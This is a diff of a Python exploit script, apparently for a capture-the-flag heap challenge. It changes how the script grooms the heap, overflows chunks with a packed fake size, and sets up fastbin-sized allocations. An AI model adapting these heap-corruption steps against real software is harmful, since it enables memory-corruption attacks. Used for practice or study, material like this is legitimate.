@@ -88,27 +88,33 @@ def stage_0_groom_the_heap(target):
 
 
 def stage_1_create_large_boots(target):
+    create_new_boot(target, 240, 'b'*240)
+    create_new_boot(target, 112, 'c' * 112)
+    create_new_boot(target, 240, 'd' * 240)
+    create_new_boot(target, 16, 'e' * 16)
+    delete_boot(target, 0)
+    delete_boot(target, 1)
     #for debugging, lets read the boots here after stage
-    create_new_boot(target, 0x108, '11111')
-    create_new_boot(target, 0x228, '22222')
-    create_new_boot(target, 0x108, '33333')
+    create_new_boot(target, 120, 'f' * 112 + p64(384))
+    delete_boot(target, 0)
+
     print 'Stage 1: Large Boots Allocated'
     read_boot(target, 0)
 
 
 def stage_2_create_and_shrink(target):
-    delete_boot(target, 1)
+    create_new_boot(target, 240, 'g' * 240)
+
     print 'Stage 2: Hole Created'
     read_boot(target, 0)
-    edit_boot(target, 0, 0x20*'A' + p64(0x108) + p64(0x0220))
     print 'Stage 2: Hole Overflowed'
-    read_boot(target, 1)
+    read_boot(target, 0)
 
 
 def stage_3_make_smaller_chunks_in_freed_block(target):
     #for debugging, lets read the boots here after stage
-    create_new_boot(target, 0x108, '44444')
-    create_new_boot(target, 0x78, '55555') #making this 0x70 instead of 0x80 because 0x80 doesn't seem to make a fastbin chunk
+    create_new_boot(target, 0x100, '44444')
+    create_new_boot(target, 0x70, '55555') #making this 0x70 instead of 0x80 because 0x80 doesn't make a fastbin chunk
     print 'Stage 3: Hole Overwritten'
     read_boot(target, 0)
 
